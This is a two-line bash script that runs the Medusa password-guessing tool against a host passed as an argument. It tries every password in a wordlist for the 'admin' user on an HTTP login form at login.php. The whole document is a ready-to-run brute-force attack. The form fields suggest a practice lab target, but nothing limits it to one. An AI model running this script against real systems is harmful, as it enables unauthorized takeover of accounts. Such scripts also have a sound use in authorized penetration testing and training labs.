#!/bin/bash
medusa -h $1 -u admin -P wordlist.txt -M http -m FORM:login.php -m FORM-DATA:"username=admin&password=^PASS^&Login=Login"
